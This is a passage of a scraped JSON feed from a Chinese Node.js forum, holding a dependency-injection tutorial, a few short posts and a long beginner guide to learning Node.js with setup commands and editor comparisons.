&quot;.&#x2F;cpu&quot;;\nimport Screen from &quot;.&#x2F;screen&quot;;\n\nlet mac = new MacBook({\n  cpu: new Cpu(),\n  screen: new Screen(),\n  battery: new Battery()\n});\n\nmac.start();\n\n</code></pre><p>将模块的依赖全都放在了启动文件 <code>index.ts</code> 处，无论模块如何改动，壳子模块 <code>mac.ts</code> 是不是都不用改了，模块之间的耦合度也降低了。</p>\n<p>简单来说，<code>mac.ts</code> 是高层模块，<code>battery.ts</code> 是底层模块，优化之前 <code>mac.ts</code> 依赖了 <code>battery.ts</code> ，是不是违背了 <code>IOC</code> 的第一条准则呢，优化后的代码是将高层次的模块所需要的依赖通过参数传递到模块内部，这个方法有一个专业术语 - 依赖注入（Dependency Injection）。</p>\n<p><strong>所需要传入的参数类型 <code>IMac</code> 就是所定义的抽象，壳子模块 <code>mac.ts</code> 就是依赖了这个抽象，而这个抽象也没有依赖于某个具体的实现。</strong></p>\n<p>那么问题又来了，如果我想给这个mac实例再增加一个触摸板模块 <code>touchpad.ts</code> 呢，是不是又要修改壳子模块 <code>mac.ts</code> 了，难道新增一个就要修改一次，就没有一个通用方案么？</p>\n<h4>案例再次优化</h4>\n<pre class=\"prettyprint language-js\"><code>\n&#x2F;&#x2F; mac.ts\n\ntype IModule&lt;T&gt; = T | T[];\n\nexport default class MacBook {\n  private modules: any[];\n\n  use&lt;T&gt;(module: IModule&lt;T&gt;) {\n    Array.isArray(module)\n      ? module.map(item =&gt; this.use(item))\n      : this.modules.push(module);\n    return this;\n  }\n\n  start() {\n    console.log(this.modules);\n  }\n}\n\n\n&#x2F;&#x2F; index.ts\n\nimport MacBook from &quot;.&#x2F;mac&quot;;\nimport Battery from &quot;.&#x2F;battery&quot;;\nimport Cpu from &quot;.&#x2F;cpu&quot;;\nimport Screen from &quot;.&#x2F;screen&quot;;\nimport Touchpad from &quot;.&#x2F;touchpad&quot;;\n\nlet mac = new MacBook();\n\nmac\n  .use(new Cpu())\n  .use(new Screen())\n  .use([new Battery({mode: &quot;high&quot;}), new Touchpad()])\n  .start();\n\n</code></pre><p>模仿 <code>koa</code> 载入模块的 <code>use</code> 方法，可以链式，这样壳子模块 <code>mac.ts</code> 就完全与低层次模块解藕了，无论mac新增多少个模块它都不会发生修改。<code>mac.ts</code> 内部已经看不到什么业务代码了，所有的配置都放在了最外层，即便修改添加也及其方便。</p>\n<p>那么问题又来了，<code>mac.ts</code> 对模块可是有要求的，不是任何一个牌子的模块就能安装到我的mac上，得按照一定的标准是执行，也就是依照一定的 <strong>约定</strong>，这也就是第三个准册，面向接口编程而不是面向实现编程，下面就用代码来展示这个准则：</p>\n<pre class=\"prettyprint language-js\"><code>\n&#x2F;&#x2F; mac.ts\ntype IModule&lt;T&gt; = T | T[];\n\nexport default class MacBook {\n  private modules: any[] = [];\n\n  use&lt;T&gt;(module: IModule&lt;T&gt;) {\n    Array.isArray(module)\n      ? module.map(item =&gt; this.use(item))\n      : this.modules.push(module);\n    return this;\n  }\n\n  start() {\n    this.modules.map(\n      module =&gt;\n        module.init &amp;&amp; typeof module.init === &quot;function&quot; &amp;&amp; module.init()\n    );\n  }\n}\n\n</code></pre><p>在 <code>mac.ts</code> 的启动方法中，我们看到了，对接的模块内部，一定要有一个 <code>init</code> 属性，且这个属性一定是一个可执行方法，那么所对接的模块要如何处理呢：</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; cpu.ts\nexport default class Cpu {\n  name = &quot;i5&quot;;\n  init() {\n    console.log(&#96;${this.name} start&#96;);\n  }\n}\n</code></pre><p>类似于这样的，要对接这个壳子，就必须在模块内部实现一个<code>init</code>方法，这样这个模块才能在壳子内部起作用。</p>\n<p><code>init</code> 方法对于 <code>mac.ts</code> 来说，只是一个抽象方法，一个约定的接口，将实现交给了所来对接的各个模块，这不就是 <strong>面向接口编程 而不要面向实现编程</strong> 最好的诠释么！</p>\n<h3>总结</h3>\n<p>其实在 <code>IOC</code> 的术语中，<code>mac.ts</code> 更应该称作为 <strong>容器(Container)</strong> ，上面称它为壳子比较贴近现实好理解，它跟业务实现其实没有太大的关联，仅仅是做一些初始化的操作，所以壳子不应该随着它所依赖的模块的改变也跟着改变。\n所以就需要一种 <code>IOC</code> 的编程思想去优化它，依赖注入只是这种思想的一种实现。</p>\n<p><strong>最后说一句，思想才是提高编程的最佳手段，而不是学习怎么用框架！</strong>\n<a href=\"https://github.com/soraping/any-source/issues/14\">原文地址</a></p>\n</div>","title":"前端 ioc 思想的简单实践","last_reply_at":"2019-04-30T03:14:59.194Z","good":false,"top":false,"reply_count":6,"visit_count":560,"create_at":"2019-04-29T10:15:46.638Z","author":{"loginname":"soraping","avatar_url":"https://avatars2.githubusercontent.com/u/8610213?v=4&s=120"}},{"id":"5cc7a5b105ae566f637fdb7c","author_id":"4f447c2f0a8abae26e01b27d","tab":"share","content":"<div class=\"markdown-text\"><p>也同时为你自己点一盏吧。</p>\n<p><img src=\"//static.cnodejs.org/FpuVWnMEZCdsXegOzWSc2gspjZfR\" alt=\"image.png\"></p>\n<p><img src=\"//static.cnodejs.org/FoL-cKZf0PuoPBSFIzpIbCIEr_Rt\" alt=\"image.png\"></p>\n</div>","title":"如果你还有 Node 6.x 的项目，请珍惜它，因为今天是 LastDay 了，请点灯 🕯🕯","last_reply_at":"2019-04-30T02:08:36.954Z","good":false,"top":false,"reply_count":2,"visit_count":649,"create_at":"2019-04-30T01:32:33.257Z","author":{"loginname":"atian25","avatar_url":"https://avatars2.githubusercontent.com/u/227713?v=4&s=120"}},{"id":"5cc6b931a86ae80ce64b560a","author_id":"5a1067384f0d21491dd96078","tab":"ask","content":"<div class=\"markdown-text\"><p>经常看到社区的文章里都配有动图，很直观，请问大家都是如何制作的，有没有好用的工具推荐(●’◡’●)</p>\n</div>","title":"gif图片制作问题","last_reply_at":"2019-04-30T02:02:20.292Z","good":false,"top":false,"reply_count":3,"visit_count":464,"create_at":"2019-04-29T08:43:29.439Z","author":{"loginname":"lucky-leaf","avatar_url":"https://avatars1.githubusercontent.com/u/31915733?v=4&s=120"}},{"id":"5cc79f6805ae566f637fdb27","author_id":"5922ddb7d371b6372a8afc55","tab":"share","content":"<div class=\"markdown-text\"><p>该文为node.js官网关于对http请求处理流程的文档翻译，本身并无复杂和难以理解的地方\n<a href=\"https://nodejs.org/en/docs/guides/anatomy-of-an-http-transaction/\">原文地址</a></p>\n<p>未完待续</p>\n</div>","title":"node.js对http请求处理过程剖析","last_reply_at":"2019-04-30T01:05:44.256Z","good":false,"top":false,"reply_count":0,"visit_count":502,"create_at":"2019-04-30T01:05:44.256Z","author":{"loginname":"hackboy","avatar_url":"https://avatars1.githubusercontent.com/u/7553085?v=4&s=120"}},{"id":"5cc7029e05ae566f637fda75","author_id":"5b2a0c5029e6e510415b2c0f","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FpgWVIewzo7AWbwOL_TfmEYMYo6g\" alt></p>\n<p><strong>其中一些课程:</strong>\n[dojo中国]ExtJs视频教程\n[极客]Node.js视频教程\n[捷训]Node.js视频教程 12集\n[麦子]Node.js + Web Socket 打造即时聊天程序\n[麦子]玩转NodeJS全栈开发之博客系统\n[实战]Vue.js+Node.js实战音乐播放器\nJade即学即用\nmongodb基础入门实例教程\nMongoDB视频教程\nnode.js+Mongo+ExtJS4.1（20集）\nnode.js从入门到实战教育项目\nNode.JS基础教程\nNode.js开发公众号实战视频\nNode.JS全栈工程师系列课程\nNodejs&amp;Express 讲座\n教程下载：<a href=\"https://www.sucaihuo.com/video/152.html\">https://www.sucaihuo.com/video/152.html</a></p>\n</div>","title":"nodejs众多培训机构视频教程集合","last_reply_at":"2019-04-29T13:56:46.685Z","good":false,"top":false,"reply_count":0,"visit_count":423,"create_at":"2019-04-29T13:56:46.685Z","author":{"loginname":"whoknowme","avatar_url":"https://avatars0.githubusercontent.com/u/40422811?v=4&s=120"}},{"id":"5ab3166be7b166bb7b9eccf7","author_id":"54009f5ccd66f2eb37190485","tab":"share","content":"<div class=\"markdown-text\"><h1>说明</h1>\n<p>2017-12-14 我发了一篇文章《没用过Node.js，就别瞎逼逼》是因为有人在知乎上黑Node.js。那篇文章的反响还是相当不错的，甚至连著名的hax贺老都很认同，下班时读那篇文章，竟然坐车的还坐过站了。大家可以很明显的感到Node.js的普及度还不够，还存很多误解。甚至说很多小白用户也得不到很好的学习。大神都功成身退，书也跟不上，大部分都是2013年左右的，Node.js版本都是基于v0.10左右的，现在已经v9了。想想也是有点可惜，使用如此广泛的Node.js被大家默认，却没人来科普。</p>\n<p>反思之后，我就想准备一个科普的Live，于是就有了《狼叔：如何正确学习 Node.js？》，相信能够对很多喜欢Node.js的朋友有所帮助。Live已完成目前1200多人，230人评价，平均4.8+，还算是一个比较成功的Live。现整理出来，希望对更多朋友有用。</p>\n<ul>\n<li>感谢 <a href=\"/user/justjavac\">@justjavac</a> 大神的<a href=\"https://github.com/justjavac/free-programming-books-zh_CN/#%E7%BD%AE%E9%A1%B6\"> 免费的计算机编程类中文书籍</a> 收录并推荐</li>\n<li><a href=\"https://github.com/i5ting/How-to-learn-node-correctly\">github地址，以后在仓库里更新</a></li>\n<li><a href=\"https://www.zhihu.com/lives/928687583372926976\">Live地址，声音版</a></li>\n</ul>\n<h1>【全文】狼叔：如何正确的学习Node.js</h1>\n<p>Live 简介</p>\n<p>现在，越来越多的科技公司和开发者开始使用 Node.js 开发各种应用。Node.js除了能够辅助大前端开发外，还可以编写Web应用，封装Api，组装RPC服务等，甚至是开发VSCode编辑器一样的PC客户端。和其它技术相比， Node.js 简单易学，性能好、部署容易，能够轻松处理高并发场景下的大量服务器请求。Node.js 周边的生态也非常强大，NPM（Node包管理）上有超过60万个模块，日下超过载量3亿次。但编写 Node.js 代码对新人和其它语言背景的开发者来说，不是一件容易的事，在入门之前需要弄懂不少复杂的概念。</p>\n<p>我身边也有很多人问我：如何学习 Node.js ？作为一名 Node.js 布道者，我做过很多 Node.js 普及和推广的工作，对它的基本概念和核心模块都很熟悉； 此外，我还在撰写一本名为《更了不起的 Node.js 》的书，已经写了 2 年，积累了很丰富的资料，本次 Live 也将为你提供对 Node.js 更全面的解读。</p>\n<p>本次 Live 主要包括以下内容，目录</p>\n<p>Part 0 ：Node.js简介</p>\n<p>a）Node.js简介\nb）什么是Node.js？\nc）基本原理</p>\n<p>Part 1前言：学习 Node.js 的三个境界</p>\n<p>Part 2准备：如何学习Node.js</p>\n<ul>\n<li>2.1 Node 用途那么多，我该从哪里学起？</li>\n<li>2.2 Node Web 框架那么多，我该怎么选？</li>\n<li>2.3 关于 Node 的书几乎都过时了，我该买哪本？</li>\n</ul>\n<p>Part 3延伸：大前端变化那么快，如何才能做到每日精进？</p>\n<p>Part 4实践：从招聘角度来看， Node.js 开发需要具备哪些技能？</p>\n<p>Part 5答疑：回答大家的问题</p>\n<p>本次Live主要是科普，适用新用户和比较迷茫的Node朋友，希望大家多多理解和支持。</p>\n<h2>Part 0 ：Node.js简介</h2>\n<p>a）Node.js简介\nb）什么是Node.js？\nc）基本原理</p>\n<h3>a）Node.js简介</h3>\n<p>Node.js 诞生于 2009 年，由 Joyent 的员工 <a href=\"https://github.com/ry\">Ryan Dahl</a> 开发而成，之后 Joyent 公司一直扮演着 Node.js 孵化者的角色。由于诸多原因，Ryan 在2012年离开社区，随后在2015年由于 Node 贡献者对 es6 新特性集成问题的分歧，导致分裂出iojs，并由 iojs 发布1.0、2.0和3.0版本。由于 iojs 的分裂最终促成了2015年Node基金会的成立，并顺利发布了4.0版本。Node.js基金会的创始成员包括 Google、Joyent、IBM、Paypal、微软、Fidelity 和 Linux基金会，创始成员将共同掌管过去由 Joyent 一家企业掌控的 Node.js 开源项目。此后，Node.js基金会发展非常好，稳定的发布5、6、7、8等版本，截止发稿最新版本已经是8.6，长期支持版本是6.11。</p>\n<p>Node.js 不是一门语言也不是框架，它只是基于 Google V8 引擎的 JavaScript 运行时环境，同时结合 Libuv 扩展了 JavaScript 功能，使之支持 io、fs 等只有语言才有的特性，使得 JavaScript 能够同时具有 DOM 操作(浏览器)和 I/O、文件读写、操作数据库(服务器端)等能力，是目前最简单的全栈式语言。</p>\n<p>早在2007年，Jeff Atwood 就提出了著名的 <code>Atwood定律</code></p>\n<blockquote>\n<p>任何能够用 JavaScript 实现的应用系统，最终都必将用 JavaScript 实现</p>\n</blockquote>\n<p>目前 Node.js 在大部分领域都占有一席之地，尤其是 I/O 密集型的，比如 Web 开发，微服务，前端构建等。不少大型网站都是使用 Node.js 作为后台开发语言的，用的最多的就是使用Node.js做前端渲染和架构优化，比如 <a href=\"https://www.taobao.com/\">淘宝</a> 双十一、<a href=\"https://www.qunar.com/\">去哪儿网</a> 的 PC 端核心业务等。另外，有不少知名的前端库也是使用 Node.js 开发的，比如，<a href=\"https://github.com/webpack/webpack\">Webpack</a> 是一个强大的打包器，<a href=\"https://github.com/facebook/react\">React</a>/<a href=\"https://github.com/vuejs/vue\">Vue</a> 是成熟的前端组件化框架。</p>\n<p>Node.js通常被用来开发低延迟的网络应用，也就是那些需要在服务器端环境和前端实时收集和交换数据的应用（API、即时聊天、微服务）。阿里巴巴、腾讯、Qunar、百度、PayPal、道琼斯、沃尔玛和 LinkedIn 都采用了 Node.js 框架搭建应用。</p>\n<p>另外， Node.js 编写的包管理器 npm 已成为开源包管理了领域最好的生态，直接到2017年10月份，有模块超过47万，每周下载量超过32亿次，每个月有超过700万开发者使用npm。</p>\n<p>当然了，Node.js 也有一些缺点。Node.js 经常被人们吐槽的一点就是：回调太多难于控制（俗称回调地狱）和 CPU 密集任务处理的不是很好。但是，目前异步流程技术已经取得了非常不错的进步，从Callback、Promise 到 Async函数，可以轻松的满足所有开发需求。至于 CPU 密集任务处理并非不可解，方案有很多，比如通过系统底层语言 Rust 来扩展 Node.js，但这样会比较麻烦。笔者坚信在合适的场景使用合适的东西，尤其是在微服务架构下，一切都是服务，可以做到语言无关。如果大家想使 JavaScript 做 CPU 密集任务，推荐 Node.js 的兄弟项目 <a href=\"http://fibjs.org/\">fibjs</a>，基于纤程(fiber，可以简单理解为更轻量级的线程)，效率非常高，兼容npm，同时没有异步回调烦恼。</p>\n<h3>b）什么是Node.js？</h3>\n<p>按照 <a href=\"https://nodejs.org/en/\">Node.js官方网站主页</a> 的说法:</p>\n<pre class=\"prettyprint\"><code>Node.js® is a JavaScript runtime built on Chrome&#x27;s V8 JavaScript engine. Node.js uses an event-driven, non-blocking I&#x2F;O model that makes it lightweight and efficient. Node.js&#x27; package ecosystem, npm, is the largest ecosystem of open source libraries in the world.\n</code></pre><p>从这段介绍来看，解读要点如下</p>\n<ul>\n<li>Node.js 不是 JavaScript 应用，不是语言（JavaScript 是语言），不是像 Rails(Ruby)、 Laravel(PHP) 或 Django(Python) 一样的框架，也不是像 Nginx 一样的 Web 服务器。Node.js 是 JavaScript 运行时环境</li>\n<li>构建在 Chrome’s V8 这个著名的 JavaScript 引擎之上，Chrome V8 引擎以 C/C++ 为主，相当于使用JavaScript 写法，转成 C/C++ 调用，大大的降低了学习成本</li>\n<li>事件驱动（event-driven），非阻塞 I/O 模型（non-blocking I/O model），简单点讲就是每个函数都是异步的，最后由 Libuv 这个 C/C++ 编写的事件循环处理库来处理这些 I/O 操作，隐藏了非阻塞 I/O 的具体细节，简化并发编程模型，让你可以轻松的编写高性能的Web应用，所以它是轻量（lightweight）且高效（efficient）的</li>\n<li>使用 <code>npm</code> 作为包管理器，目前 <code>npm</code> 是开源库里包管理最大的生态，功能强大，截止到2017年12月，模块数量超过 60 万+</li>\n</ul>\n<p>大多数人都认为 Node.js 只能写网站后台或者前端工具，这其实是不全面的，Node.js的目标是让并发编程更简单，主要应用在以网络编程为主的 I/O 密集型应用。它是开源的，跨平台，并且高效（尤其是I/O处理），包括IBM、Microsoft、Yahoo、SAP、PayPal、沃尔玛及GoDaddy都是 Node.js 的用户。</p>\n<h3>c）基本原理</h3>\n<p>下面是一张 Node.js 早期的架构图，来自 Node.js 之父 Ryan Dahl 的演讲稿，在今天依然不过时，它简要的介绍了 Node.js 是基于 Chrome V8引擎构建的，由事件循环（Event Loop）分发 I/O 任务，最终工作线程（Work Thread）将任务丢到线程池（Thread Pool）里去执行，而事件循环只要等待执行结果就可以了。</p>\n<p><img src=\"//static.cnodejs.org/Fh2MIT1r4YStGl9ZEEzt7N4lEbqX\" alt=\"14912763353044.png\"></p>\n<p>核心概念</p>\n<ul>\n<li>Chrome V8 是 Google 发布的开源 JavaScript 引擎，采用 C/C++ 编写，在 Google 的 <code>Chrome</code> 浏览器中被使用。Chrome V8 引擎可以独立运行，也可以用来嵌入到 C/C++ 应用程序中执行。</li>\n<li>Event Loop 事件循环（由 <code>libuv</code> 提供）</li>\n<li>Thread Pool 线程池（由 <code>libuv</code> 提供）</li>\n</ul>\n<p>梳理一下</p>\n<ul>\n<li>Chrome V8 是 JavaScript 引擎</li>\n<li>Node.js 内置 Chrome V8 引擎，所以它使用的 JavaScript 语法</li>\n<li>JavaScript 语言的一大特点就是单线程，也就是说，同一个时间只能做一件事</li>\n<li>单线程就意味着，所有任务需要排队，前一个任务结束，才会执行后一个任务。如果前一个任务耗时很长，后一个任务就不得不一直等着。</li>\n<li>如果排队是因为计算量大，CPU 忙不过来，倒也算了，但是很多时候 CPU 是闲着的，因为 I/O 很慢，不得不等着结果出来，再往下执行</li>\n<li>CPU 完全可以不管 I/O 设备，挂起处于等待中的任务，先运行排在后面的任务</li>\n<li>将等待中的 I/O 任务放到 Event Loop 里</li>\n<li>由 Event Loop 将 I/O 任务放到线程池里</li>\n<li>只要有资源，就尽力执行</li>\n</ul>\n<p>我们再换一个维度看一下</p>\n<p><img src=\"//static.cnodejs.org/FkTMjCoX4xyL0rJtmm7oBc6V0i8W\" alt=\"14992384974942.png\"></p>\n<p>核心</p>\n<ul>\n<li>Chrome V8 解释并执行 JavaScript 代码（这就是为什么浏览器能执行 JavaScript 原因）</li>\n<li><code>libuv</code> 由事件循环和线程池组成，负责所有 I/O 任务的分发与执行</li>\n</ul>\n<p>在解决并发问题上，异步是最好的解决方案，可以拿排队和叫号机来理解</p>\n<ul>\n<li>排队：在排队的时候，你除了等之外什么都干不了</li>\n<li>叫号机：你要做的是先取号码，等轮到你的时候，系统会通知你，这中间，你可以做任何你想做的事儿</li>\n</ul>\n<p>Node.js 其实就是帮我们构建类似的机制。我们在写代码的时候，实际上就是取号的过程，由 Event Loop 来接受处理，而真正执行操作的是具体的线程池里的 I/O 任务。之所以说 Node.js 是单线程，就是因为在接受任务的时候是单线程的，它无需进程/线程切换上下文的成本，非常高效，但它在执行具体任务的时候是多线程的。</p>\n<p>Node.js 公开宣称的目标是 “旨在提供一种简单的构建可伸缩网络程序的方法”，毫无疑问，它确实做到了。这种做法将并发编程模型简化了，Event Loop和具体线程池等细节被 Node.js 封装了，继而将异步调用 Api 写法暴露给开发者。真是福祸相依，一方面简化了并发编程，另一方面在写法上埋下了祸根，这种做法的好处是能让更多人轻而易举的写出高性能的程序！</p>\n<p>在Node.js Bindings层做的事儿就是将 Chrome V8 等暴露的 <code>C/C++</code> 接口转成JavaScript Api，并且结合这些 Api 编写了 Node.js 标准库，所有这些 Api 统称为 Node.js SDK，后面模块章节会有更详细的讨论。</p>\n<p>微软在2016年宣布在MIT许可协议下开放 Chakra 引擎，并以 <code>ChakraCore</code> 为名在 Github 上开放了源代码，<code>ChakraCore</code> 是一个完整的 JavaScript 虚拟机，它拥有着和 <code>Chakra</code> 几乎相同的功能与特性。微软向 Node.js 主分支提交代码合并请求，让 Node.js 用上 <code>ChakraCore</code>引擎，即 <a href=\"https://github.com/nodejs/node-chakracore\">nodejs/node-chakracore</a> 项目。实际上微软是通过创建名为 <code>V8 shim</code> 的库的赋予了 <code>ChakraCore</code> 处理谷歌 Chrome V8 引擎指令的能力，其原理示意图如下</p>\n<p><img src=\"//static.cnodejs.org/FmJWcazPP4smFeEzBnfnEJuW36ts\" alt=\"15018598977763.jpg\"></p>\n<p>目前，Node.js 同时支持这2种 JavaScript 引擎，二者性能和特性上各有千秋，<code>ChakraCore</code> 在特性上感觉更潮一些，曾经是第一个支持 <code>Async函数</code> 的引擎，但目前 Node.js 还是以 Chrome V8 引擎为主， <code>ChakraCore</code> 版本需要单独安装，大家了解一下就好。</p>\n<h2>Part 1前言：学习 Node.js 的三个境界</h2>\n<p>我总结的编程3种境界</p>\n<ul>\n<li>打日志：console.log</li>\n<li>断点调试：断点调试：node debugger 或node inspector 或vscode</li>\n<li>测试驱动开发（tdd | bdd）</li>\n</ul>\n<p>大家可以自测一下，自己在哪个水平？如果是第三个阶段，那么本场Live可能不太适合你。哈哈哈</p>\n<h2>Part 2准备：如何学习Node.js</h2>\n<p>Node不是语言，不是框架，只是基于V8运行时环境。结合libuv能够通过js语法获得更好的等价于c/c++的性能。</p>\n<p>它很简单，异步是解决并发的最佳实践。本节主要讲如何学习Node.js，是本次Live非常核心的内容，大家要注意听。</p>\n<h3>基础学习</h3>\n<p>1）js语法必须会</p>\n<ol>\n<li>js基本语法，都是c语系的，有其他语言背景学习起来相对更简单</li>\n<li>常见用法，比如正则，比如数据结构，尤其是数组的几种用法。比如bind/call/apply等等</li>\n<li>面向对象写法。js是基于对象的，所以它的oo写起来非常诡异。参见红皮书JavaScript高级编程，很多框架都是自己实现oo基础框架，比如ext-core等。</li>\n</ol>\n<p>犀牛书，《JavaScript权威指南》，没事就多翻翻，看少多少遍都不为过。</p>\n<p>2）个人学习和技术选型都要循序渐进</p>\n<ol>\n<li>先能写，采用面向过程写法，简单理解就是定义一堆function，然后调用，非常简单</li>\n<li>然后再追求更好的写法，可以面向对象。对于规模化的编程来说，oo是有它的优势的，一般java、c#，ruby这些语言里都有面向对象，所以后端更习惯，但对于语言经验不那么强的前端来说算高级技巧。</li>\n<li>等oo玩腻了，可以有更好的追求：函数式编程，无论编程思维，还是用法上都对已有的编程思维是个挑战。我很喜欢函数式，但不太会在团队里使用，毕竟oo阶段还没完全掌握，风险会比较大。但如果团队水平都非常高了，团队稳定是可以用的。</li>\n</ol>\n<p>可以看出我的思路，先能写，然后再追求更好的写法，比如面向对象。等团队水平到一定程度了，并且稳定的时候，可以考虑更加极致的函数式写法。</p>\n<p>团队是这样选型的，个人学习也这样，最好是循序渐进，步子迈大了不好。</p>\n<p>3）各种高级的JavaScript友好语言</p>\n<p>JavaScript友好语言指的是能够使用其他语法实现，但最终编译成js的语言。自从Node.js出现后，这种黑科技层出不穷。比如比较有名的coffee、typescript、babel（es）等。</p>\n<p>CoffeeScript虽然也是JavaScript友好语言，但其语法借鉴ruby，崇尚极简，对于类型和OO机制上还是偏弱，而且这么多年也没发展起来，仍然是比较小众的活着。未来比例会越来越少的。</p>\n<p>显然TypeScript会越来越好，TypeScript 的强大之处是要用过才知道的。</p>\n<ul>\n<li>1）规模化编程，像Java那种，静态类型，面向对象，前端只有TypeScript能做到</li>\n<li>2）亲爹是微软安德斯·海尔斯伯格，不知道此人的请看borland传奇去</li>\n<li>3）开源，未来很好</li>\n<li>4）组合拳：TypeScript + VSCode = 神器</li>\n</ul>\n<p>当下前端发展速度极快，以指数级的曲线增长。以前可能1年都不一定有一项新技术，现在可能每个月都有。大前端，Node全栈，架构演进等等都在快速变化。可以说，前端越复杂，有越多的不确定性，TypeScript的机会就越大。</p>\n<p>4）再论面向对象</p>\n<p>面向对象想用好也不容易的，而且js里有各种实现，真是让人眼花缭乱。</p>\n<ul>\n<li>基于原型的写法，纵观JavaScript高级编程，就是翻来覆去的讲这个，这个很基础，但不好是很好用。可以不用，但不可以不会。</li>\n<li>自己写面向对象机制是最好的，但不是每个人都有这个能力的。好在es6规范出了更好一点的面向对象，通过class、extends、super关键字来定义类，已经明显好很多了，虽然还很弱，但起码勉强能用起来了。从面向过程走过来的同学，推荐这种写法，简单易用。但要注意面向对象要有面向对象的写法，要理解抽象，继承，封装，多态4个基本特征。如果想用好，你甚至还需要看一些设计模式相关的书。好在有《JavaScript设计模式》一书。Koa2里已经在用这种写法了。</li>\n<li>js是脚本语言，解释即可执行。所以它的最大缺点是没有类型系统，这在规模化编程里是非常危险的，一个函数，传参就能玩死人。于是现在流行使用flow和typescript来做类型校验。flow只是工具，比较轻量级。而typescript是es6超级，给es6补充了类型系统和更完善的面向对象机制，所以大部分人都会对ts有好感，很有可能是未来的趋势。</li>\n</ul>\n<p>对于es6高级特性，我是比较保守的，一般node长期支持版本lts支持的我都让用，一些更新的特性我一般不让使用。根本lts版本保持一致就好。</p>\n<p>我的团队现在是采用es6的面向对象写法开发，后面会一点一点转到typescript上的。熟练oo转到ts是非常容易的。</p>\n<h3>安装Node.js环境</h3>\n<p>3m安装法</p>\n<ul>\n<li>nvm（node version manager）【需要使用npm安装，替代品是yrm（支持yarn），nvs对window支持很好】</li>\n<li>nrm（node registry manager）【需要使用npm安装，替代品是yrm（支持yarn）】</li>\n<li>npm（node packages manager）【内置，替代品是n或nvs（对win也支持）】</li>\n</ul>\n<h4>nvm</h4>\n<p>node版本发布非常快，而且多版本共存可能性较大，推荐使用nvm来安装node</p>\n<pre class=\"prettyprint language-shell\"><code>$ curl -o- https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;creationix&#x2F;nvm&#x2F;v0.33.6&#x2F;install.sh | bash\n\n$ echo &#x27;export NVM_DIR=&quot;$HOME&#x2F;.nvm&quot;&#x27; &gt;&gt; ~&#x2F;.zshrc\n$ echo &#x27;[ -s &quot;$NVM_DIR&#x2F;nvm.sh&quot; ] &amp;&amp; . &quot;$NVM_DIR&#x2F;nvm.sh&quot; # This loads nvm&#x27; &gt;&gt; ~&#x2F;.zshrc\n$ source ~&#x2F;.zshrc\n\n$ nvm install 0.10\n$ nvm install 4\n$ nvm install 6\n$ nvm install 8\n</code></pre><h4>nrm</h4>\n<p><a href=\"https://registry.npmjs.com\">https://registry.npmjs.com</a> 是node官方的源（registry），服务器在国外，下载速度较慢，推荐安装nrm来切换源，国内的cnpm和taobao的源都非常快，当然，如果你想自建源也是支持的。</p>\n<pre class=\"prettyprint language-shell\"><code>$ npm install --global nrm --registry=https:&#x2F;&#x2F;registry.npm.taobao.org\n$ nrm use cnpm\n</code></pre><h4>npm</h4>\n<p>nrm切换完源之后，你安装npm模块的速度会更快。</p>\n<pre class=\"prettyprint language-shell\"><code>$ npm install --global yarn\n</code></pre><p>npm基本命令</p>\n<table>\n<thead>\n<tr>\n<th>名称</th>\n<th>描述</th>\n<th>简写</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>npm install xxx</td>\n<td>安装xxx模块，但不记录到package.json里</td>\n<td>npm i xxx</td>\n</tr>\n<tr>\n<td>npm install --save xxx</td>\n<td>安装xxx模块，并且记录到package.json里，字段对应的dependency，是产品环境必须依赖的模块</td>\n<td>npm i -s xxx</td>\n</tr>\n<tr>\n<td>npm install --save-de xxx</td>\n<td>安装xxx模块，并且记录到package.json里，字段对应的dev-dependency，是开发环境必须依赖的模块，比如测试类的（mocha、chai、sinon、zombie、supertest等）都在</td>\n<td>npm i -D xxx</td>\n</tr>\n<tr>\n<td>npm install --global xxx</td>\n<td>全局安装xxx模块，但不记录到package.json里，如果模块里package.json有bin配置，会自动链接，作为cli命令</td>\n<td>npm i -g xxx</td>\n</tr>\n</tbody>\n</table>\n<h3>常用软件</h3>\n<ul>\n<li>1）oh my zsh是我最习惯的shell，终端下非常好用</li>\n</ul>\n<p>配合iterm2分屏 + spectacle全屏，几乎无敌</p>\n<ul>\n<li>2）brew是mac装软件非常好的方式，和apt-get、rpm等都非常类似</li>\n</ul>\n<p>安装4个必备软件</p>\n<ul>\n<li>\n<p>brew install git 最流行的SCM源码版本控制软件</p>\n</li>\n<li>\n<p>brew install wget 下载、扒站神器</p>\n</li>\n<li>\n<p>brew install ack  搜索代码神器</p>\n</li>\n<li>\n<p>brew install autojump 终端下多目录跳转神器</p>\n</li>\n<li>\n<p>3）vim</p>\n</li>\n</ul>\n<p>我虽然不算vim党，但也深爱着。janus是一个非常好用的vim集成开发环境。比如ctrl-p、nerdtree等插件都集成了，对我这种懒人足够了。</p>\n<h3>IDE和编辑器</h3>\n<p>关于Node.js的IDE和编辑器有很多选择，对比如下</p>\n<table>\n<thead>\n<tr>\n<th>名称</th>\n<th>是否收费</th>\n<th>断点调试</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Webstorm</td>\n<td>收费</td>\n<td>支持</td>\n<td>是IDE，在代码提示、重构等方面功能非常强大，支持的各种语言、框架、模板也非常多，支持断点调试，好处是特别智能，缺点也是特别智能</td>\n</tr>\n<tr>\n<td>Sublime/TextMate</td>\n<td>收费</td>\n<td>不支持</td>\n<td>编辑器里非常好用的，textmate主要针对mac用户，sublime是跨平台的，相信很多前端开发都熟悉</td>\n</tr>\n<tr>\n<td>Vim/Emace</td>\n<td>免费</td>\n<td>不支持</td>\n<td>命令行下的编辑器，非常强大，难度也稍大，但更为酷炫，而且对于服务器部署开发来说是值得一学的</td>\n</tr>\n<tr>\n<td>VSCode/Atom</td>\n<td>免费</td>\n<td>支持</td>\n<td>Atom比较早，功能强大，缺点稍卡顿，VSCode是微软出的，速度快，对于Node.js 调试，重构，代码提示等方面支持都非常好</td>\n</tr>\n</tbody>\n</table>\n<p><a href=\"https://code.visualstudio.com/\">Visual Studio Code</a>是一个运行于 Mac、Windows和 Linux 之上的，针对于编写现代 Web 和云应用的跨平台源代码编辑器。它功能强大，便于调试，加上它本身也是基于 Node.js 模块 <code>electron</code> 构建的，尤其要推荐大家使用。</p>\n<p>Visual Studio Code（以下简称vsc）</p>\n<ul>\n<li>vsc是一个比较潮比较新的编辑器（跨平台Mac OS X、Windows和 Linux 